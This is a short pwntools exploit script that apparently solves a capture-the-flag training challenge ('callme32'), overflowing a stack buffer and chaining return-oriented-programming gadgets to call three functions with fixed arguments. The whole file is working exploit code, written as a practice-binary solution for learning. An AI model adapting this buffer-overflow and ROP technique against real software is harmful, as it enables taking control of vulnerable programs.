#!/usr/bin/env python3

from pwn import *

pwn = process("./callme32")

buf = b'A'*44
buf += p32(0x080485c0) # callme_one
buf += p32(0x08048576) # add esp, 8; pop ebx; ret
buf += p32(0x1) # arg 1
buf += p32(0x2) # arg 2
buf += p32(0x3) # arg 3
buf += p32(0x08048620) # callme_two                                            
buf += p32(0x08048576) # add esp, 8; pop ebx; ret                               
buf += p32(0x1) # arg 1                                                         
buf += p32(0x2) # arg 2                                                         
buf += p32(0x3) # arg 3 
buf += p32(0x080485b0) # callme_three                                             
buf += p32(0x08048576) # add esp, 8; pop ebx; ret                               
buf += p32(0x1) # arg 1                                                         
buf += p32(0x2) # arg 2                                                         
buf += p32(0x3) # arg 3 

pwn.sendline(buf)
pwn.interactive()
